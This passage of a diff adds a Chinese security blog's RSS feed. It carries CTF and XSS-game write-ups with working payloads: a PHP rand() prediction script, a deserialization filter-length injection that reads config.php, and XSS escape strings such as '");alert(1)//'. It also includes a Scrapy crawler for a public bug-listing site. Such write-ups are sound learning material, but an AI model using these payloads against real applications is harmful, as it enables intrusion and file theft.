+&lt;/div&gt;
+
+&lt;p&gt;瞬间涨姿势了有木有，于是写脚本爆破之：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import requests
+
+while True:
+    r = requests.session()
+    l = []
+    for i in range(50):
+        response = r.get(&#39;http://127.0.0.1/test.php&#39;)
+        l.append(int(response.content[:response.content.find(&#39;&amp;lt;&#39;)]))
+
+    response = r.get(&#39;http://127.0.0.1/test.php?go&#39;)
+    l.append(int(response.content[:-32]))
+
+    url = &#39;http://127.0.0.1/test.php?&#39;
+    for i in range(5):
+        end = len(l)
+
+        randnum = (l[end - 3] + l[end - 31]) % 2 **31
+        l.append(randnum)
+
+        url += &#39;check[]={}&amp;amp;&#39;.format(randnum)
+
+    response = r.get(url)
+    if &#39;die&#39; not in response.content:
+        print response.content
+        break
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;得到flag：0ctf{randisawesomebutdangerous}&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;piapiapia&quot;&gt;piapiapia&lt;/h2&gt;
+
+&lt;p&gt;这题是道审计题，苦读代码无数遍后并没有发现什么漏洞，各种过滤都很完善，上传的文件也被md5重命名，无法执行。这时队里的pei大腿出场了，&lt;br /&gt;
+发现在profile.php里显示图片是用的这样的代码：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));
+&amp;lt;img src=&quot;data:image/gif;base64,&amp;lt;?php echo $photo; ?&amp;gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;这意味着我们如果能控制$profile的话就能实现任意文件读取。继续看代码：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$profile = unserialize($profile);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;说明$profile是经历了序列化与反序列化操作，此时并没有抱多少希望。继续看update.php中序列化操作的代码：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$profile[&#39;phone&#39;] = $_POST[&#39;phone&#39;];
+$profile[&#39;email&#39;] = $_POST[&#39;email&#39;];
+$profile[&#39;nickname&#39;] = $_POST[&#39;nickname&#39;];
+$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);
+
+$user-&amp;gt;update_profile($username, serialize($profile));
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;可以看到$profile序列化后的内容被扔进了update_profile函数进行处理，继续跟踪进class.php查看update_profile函数，发现了这么一个地方：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public function filter($string) {
+	$escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
+	$escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;
+	$string = preg_replace($escape, &#39;_&#39;, $string);
+
+	$safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
+	$safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;
+	return preg_replace($safe, &#39;hacker&#39;, $string);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;咋一看这个函数，一个标准的sql注入过滤函数，过滤的反斜线和单引号，同时把一些危险的字符串例如‘select’等做了替换。&lt;br /&gt;
+这么看没什么问题，但是如果了解序列化的机制的话，就会发现其中隐含的漏洞点。&lt;br /&gt;
+‘select’、‘insert’、‘update’、‘delete’、‘where’这5个字符串，均会被替换为‘hacker’。前4个字符串为6个字符，而‘where’为5个字符，‘hacker’为6个字符。这意味着只有字符串中存在‘where’时会发生长度的改变。而list在被序列化成字符串时，其每一部分的长度均以例如‘s:5’的形式被固定在了字符串中，在反序列化时会按照这个值去还原数组。&lt;br /&gt;
+举个例子，$a = array(‘where’)序列化后的字符串为‘a:1{i:0;s:5:”where”;}’，这串字符串在经过过滤函数替换操作后变成了‘a:1{i:0;s:5:”hacher”;}’，这会导致在反序列化时‘hacker’的最后一个字母‘r’读不到，从而导致出错。&lt;br /&gt;
+于是我们可以利用这点，构造一定量的‘where’字符加上序列化控制符号覆盖掉其后的字符串，使得反序列化后的值为我们所控。&lt;br /&gt;
+同时我们发现nickname变量的过滤代码如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &amp;gt; 10)
+	die(&#39;Invalid nickname&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;如果nickname为数组即可绕过过滤，结合序列化的漏洞，我们就可以控制其后的photo变量，做到任意文件读取。&lt;br /&gt;
+payload如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nickname[0] = &#39;wherewherewherewherewherewherewherewherewherewherewhere&quot;;i:1;s:26:&#39;
+nickname[1] = &#39;333&quot;;i:2;s:1:&quot;1&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}a:1{s:12:&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;将其post过去后成功读取config.php里的flag：0ctf{fa717b49649fbb9c0dd0d1663469a871}&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;section-1&quot;&gt;后记&lt;/h2&gt;
+
+&lt;p&gt;两天就这么两道题，真是深深滴感觉自己菜，在从腿毛挂件进化成大腿的路上任重道远啊。&lt;/p&gt;
+</description>
+        <pubDate>Mon, 14 Mar 2016 00:00:00 +0800</pubDate>
+        <link>http://dogewatch.github.io/2016/03/14/0ctf-web/</link>
+        <guid isPermaLink="true">http://dogewatch.github.io/2016/03/14/0ctf-web/</guid>
+        
+        <category>ctf</category>
+        
+        <category>web</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Wooyun Bugs</title>
+        <description>&lt;blockquote&gt;
+  &lt;p&gt;“little little spider”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;最近挖漏洞挖得眼睛疼，于是想换个事做，玩玩爬虫。要问爬虫技术哪家强，当然要属scrapy。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;section-1&quot;&gt;正文&lt;/h2&gt;
+
+&lt;p&gt;闲话也不多说，直接上代码吧。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# encoding: utf-8&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scrapy&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scrapy.spider&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Spider&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scrapy.spider&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BaseSpider&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Spider&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;traceback&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;wooyun.items&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;wooyunSpider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CrawlSpider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;wooyunSpider&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;allowed_domains&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wooyun.org&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://www.wooyun.org/bugs/new_public/page/&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;start_urls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+   &lt;span class=&quot;c&quot;&gt;#start_urls = [&#39;http://www.wooyun.org/bugs/new_public/page/4&#39;]&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kwargs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;begin_page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kwargs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;begin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;end_page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kwargs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1848&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;begin_page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end_page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start_urls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sel&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;//table[@class=&#39;listTable&#39;]/tbody/tr&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;td[1]/img[@class=&#39;credit&#39;]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())):&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WooyunItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;time&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;th[1]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;td[1]/a/text()&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;link&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://www.wooyun.org&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;td[1]/a/@href&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;author&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;th[last()]/a/@title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;credit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;td[1]/img[@class=&#39;credit&#39;]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;credit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;IndexError&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;traceback&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_exc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;最开始爬下来的数据并不是按照时间排序的，需要另些个脚本进行排序，这里就不贴代码了。&lt;/p&gt;
+
+&lt;p&gt;最终效果如图：&lt;br /&gt;
+&lt;img src=&quot;/img/post/wooyun-bugs.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;section-2&quot;&gt;后记&lt;/h2&gt;
+
+&lt;p&gt;后面想写个升级版来着，把所有的内容离线下来，然后想了想我的流量，算了 &amp;gt;_&amp;lt;&lt;br /&gt;
+还是继续看php挖漏洞好了。&lt;/p&gt;
+</description>
+        <pubDate>Wed, 09 Mar 2016 00:00:00 +0800</pubDate>
+        <link>http://dogewatch.github.io/2016/03/09/wooyun/</link>
+        <guid isPermaLink="true">http://dogewatch.github.io/2016/03/09/wooyun/</guid>
+        
+        <category>web</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>escape.alf.nu</title>
+        <description>&lt;blockquote&gt;
+  &lt;p&gt;“X站之路”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;看了一段时间的XSS，打算找点东西练练手，于是就找到了&lt;a href=&quot;http://escape.alf.nu/&quot;&gt;这个&lt;/a&gt;。&lt;br /&gt;
+边查资料边做，还是有些收获吧，这里先把前面15个题做个总结。&lt;/p&gt;
+
+&lt;h2 id=&quot;section-1&quot;&gt;正文&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://escape.alf.nu/0&quot;&gt;第0题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  // Warmup.
+
+  return &#39;&amp;lt;script&amp;gt;console.log(&quot;&#39;+s+&#39;&quot;);&amp;lt;/script&amp;gt;&#39;;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这里没有做任何的过滤，所以只需要闭合掉双引号和括号，最后用注释符注释掉剩余部分即可。&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+&quot;);alert(1)//
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://escape.alf.nu/1&quot;&gt;第1题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  // Escaping scheme courtesy of Adobe Systems, Inc.
+  s = s.replace(/&quot;/g, &#39;\\&quot;&#39;);
+  return &#39;&amp;lt;script&amp;gt;console.log(&quot;&#39; + s + &#39;&quot;);&amp;lt;/script&amp;gt;&#39;;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这里对双引号做了转义，因此不能直接使用双引号闭合。但是因为没有对反斜线做转义，所以可以用反斜线去转义掉双引号前的反斜线从而使得双引号依然可以闭合。&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+\&quot;);alert(1)//
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://escape.alf.nu/2&quot;&gt;第2题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  s = JSON.stringify(s);
+  return &#39;&amp;lt;script&amp;gt;console.log(&#39; + s + &#39;);&amp;lt;/script&amp;gt;&#39;;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这里用JSON.stringify对反斜线做了转义，所以不能采用上一题的解法。但是’&amp;lt;’、’&amp;gt;’均未被过滤，所以可以直接闭合script标签后另起一个script标签进行弹窗。&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)//
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://escape.alf.nu/3&quot;&gt;第3题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  var url = &#39;javascript:console.log(&#39; + JSON.stringify(s) + &#39;)&#39;;
+  console.log(url);
+
+  var a = document.createElement(&#39;a&#39;);
+  a.href = url;
+  document.body.appendChild(a);
+  a.click();
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这里同样用stringify对双引号和反斜线做了过滤。但是可以发现s的值放入了url中，猜测可以使用URL编码绕过。将第0题的payload中的双引号替换为%22成功绕过。&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+%22);alert(1)//
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://escape.alf.nu/4&quot;&gt;第4题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  var text = s.replace(/&amp;lt;/g, &#39;&amp;amp;lt;&#39;).replace(&#39;&quot;&#39;, &#39;&amp;amp;quot;&#39;);
+  // URLs
+  text = text.replace(/(http:\/\/\S+)/g, &#39;&amp;lt;a href=&quot;$1&quot;&amp;gt;$1&amp;lt;/a&amp;gt;&#39;);
+  // [[img123|Description]]
+  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, &#39;&amp;lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&amp;gt;&#39;);
+  return text;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
